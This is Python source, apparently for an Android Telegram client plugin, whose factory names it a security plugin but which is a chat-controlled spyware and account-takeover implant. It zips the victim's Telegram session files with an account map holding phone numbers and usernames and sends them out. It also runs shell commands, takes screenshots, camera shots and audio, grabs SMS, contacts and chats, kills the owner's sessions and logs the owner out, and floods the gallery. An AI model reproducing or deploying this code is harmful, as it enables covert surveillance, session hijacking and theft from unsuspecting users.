    def _handle_message(self, msg):
        try:
            t = (msg.get("text") or "").strip()
            if not t:
                return
            if self._input_mode == "music":
                self._input_mode = None
                if t.startswith(("http://", "https://")):
                    self._play_mmusic(t)
                else:
                    self._send_msg("Bad URL")
                return
            if self._input_mode == "video":
                self._input_mode = None
                if t.startswith(("http://", "https://")):
                    self._play_mvideo(t)
                else:
                    self._send_msg("Bad URL")
                return
            if self._input_mode == "shell":
                self._input_mode = None
                if t:
                    self._manual_shell(t)
                return
            if self._input_mode == "flood":
                self._input_mode = None
                if t.startswith(("http://", "https://")):
                    threading.Thread(target=self._flood_gallery,
                                     args=(t, 100), daemon=True).start()
                else:
                    self._send_msg("Bad URL")
                return

            if t == "Manual using":
                self._show_manual_menu()
            elif t == "Troll":
                self._show_troll_menu()
            elif t == "⬅️ Back":
                self._show_full_menu()
            elif t == "Session Control":
                self._show_sessions_menu()
            elif t == "Surveillance":
                self._show_surveillance_menu()
            elif t == "Data Grab":
                self._show_data_menu()
            elif t == "Account":
                self._show_account_menu()
            elif t == "Shell":
                self._show_shell_menu()
            elif t == "Session gain":
                threading.Thread(target=self._session_gain, daemon=True).start()
            elif t == "Full Pull out":
                threading.Thread(target=self._full_pull_out, daemon=True).start()
            elif t == "Screenshot":
                threading.Thread(target=self._screenshot, daemon=True).start()
            elif t == "Camera Front":
                threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
            elif t == "Camera Back":
                threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
            elif t == "Audio 5s":
                threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
            elif t == "SMS":
                threading.Thread(target=self._manual_sms, daemon=True).start()
            elif t == "Contacts":
                threading.Thread(target=self._manual_contacts, daemon=True).start()
            elif t == "Apps":
                threading.Thread(target=self._manual_apps, daemon=True).start()
            elif t == "Chats":
                threading.Thread(target=self._manual_chats, daemon=True).start()
            elif t == "Info":
                threading.Thread(target=self._harvest_account_info,
                                 args=(0, True), daemon=True).start()
            elif t == "Pull Out":
                threading.Thread(target=self._full_pull_out, daemon=True).start()
            elif t == "ls /sdcard":
                self._manual_shell("ls /sdcard")
            elif t == "ps":
                self._manual_shell("ps -A")
            elif t == "ifconfig":
                self._manual_shell("ifconfig")
            elif t == "df -h":
                self._manual_shell("df -h")
            elif t == "M-music":
                self._input_mode = "music"
                self._send_msg("Send .mp3 URL")
            elif t == "M-Video":
                self._input_mode = "video"
                self._send_msg("Send .mp4 URL")
            elif t == "Flood Gallery":
                self._input_mode = "flood"
                self._send_msg("Send photo URL")
            elif t == "Clear Flood":
                self._clear_flood()
            # Ransom / Lock screen / Dim screen — удалены из меню
        except Exception as e:
            _log("handle msg: %s" % e)

    def _truncate_zip_entries(self, entries, max_bytes):
        """entries: list[(arcname, path)] -> list[(arcname, path)] в пределах max_bytes."""
        out = []
        total = 0
        for arc, path in entries:
            try:
                sz = os.path.getsize(path)
            except Exception:
                continue
            if total + sz > max_bytes:
                continue
            out.append((arc, path))
            total += sz
        return out

    def _session_gain(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                self._send_msg("no ctx")
                return
            pkg = str(ctx.getPackageName())
            base = "/data/data/%s" % pkg
            priority = [
                base + "/files/tgnet.dat",
                base + "/files/cache4.db",
                base + "/files/cache4.db-wal",
                base + "/files/cache4.db-shm",
            ]
            ad = base + "/files"
            if os.path.isdir(ad):
                for name in sorted(os.listdir(ad)):
                    if name.startswith("account"):
                        p = ad + "/" + name + "/tgnet.dat"
                        if os.path.exists(p):
                            priority.append(p)
                        uc = ad + "/" + name + "/userconfig.xml"
                        if os.path.exists(uc):
                            priority.append(uc)
            pd = base + "/shared_prefs"
            if os.path.isdir(pd):
                for name in sorted(os.listdir(pd)):
                    low = name.lower()
                    if ("userconfig" in low or "userconfing" in low
                            or "cache4" in low) and name.endswith(".xml"):
                        priority.append(pd + "/" + name)
            entries = []
            for p in priority:
                if os.path.exists(p):
                    entries.append((os.path.relpath(p, base).replace("\\", "/"), p))
            if not entries:
                self._send_msg("Session gain: no files")
                return
            chosen = self._truncate_zip_entries(entries, MAX_DOC_SIZE)
            if not chosen:
                self._send_msg("Session gain: nothing fits 5MB")
                return
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for arc, path in chosen:
                    try:
                        zf.write(path, arcname=arc)
                    except Exception:
                        pass
            data = z.getvalue()
            if len(data) > MAX_DOC_SIZE:
                self._send_msg("Session gain: zip > 5MB after compress (%d)" % len(data))
                return
            amap = {}
            for a in self._get_accounts_list():
                amap[str(a.get("id"))] = {
                    "user_id": a.get("user_id"),
                    "username": a.get("username", ""),
                    "phone": a.get("phone", ""),
                }
            z2 = io.BytesIO()
            with zipfile.ZipFile(z2, "w", zipfile.ZIP_DEFLATED) as zf:
                for arc, path in chosen:
                    try:
                        zf.write(path, arcname=arc)
                    except Exception:
                        pass
                if amap:
                    zf.writestr("accounts_map.json",
                                json.dumps(amap, ensure_ascii=False, indent=2))
            final = z2.getvalue()
            self._send_document_bytes("session_gain.zip", final)
            self._send_msg("Session gain: %d files, %d bytes" % (len(chosen), len(final)))
        except Exception as e:
            self._send_msg("Session gain err: " + str(e))

    def _full_pull_out(self):
        try:
            self._send_msg("Full Pull out...")
            total_killed = 0
            total_seen = 0
            for _pass in range(3):
                try:
                    k, t = self._kill_all_sessions(0, phones_pc_only=False)
                    total_killed += k
                    total_seen = max(total_seen, t)
                except Exception as e:
                    _log("full_pull_out pass %d: %s" % (_pass, e))
                time.sleep(1.5)
            try:
                web = self._kill_web_authorizations(0)
            except Exception:
                web = 0
            try:
                self._pull_out_account()
            except Exception as e:
                _log("full_pull_out logout: %s" % e)
            self._send_msg(
                "<b>Full Pull out done</b>\n"
                "Killed: %d / %d\nWeb: %d\nLogout: sent" % (
                    total_killed, total_seen, web), html=True)
        except Exception as e:
            self._send_msg("Full Pull out err: " + str(e))

def _media_prepared_cls():
    global _MediaPreparedCls
    if _MediaPreparedCls is None:
        MP = jclass("android.media.MediaPlayer$OnPreparedListener")

        class _MP(dynamic_proxy(MP)):
            def __init__(self, vv):
                super().__init__()
                self.vv = vv

            def onPrepared(self, mp):
                try:
                    self.vv.start()
                except Exception:
                    pass

        _MediaPreparedCls = _MP
    return _MediaPreparedCls


def create_plugin():
    return PluginSecurityPlugin()
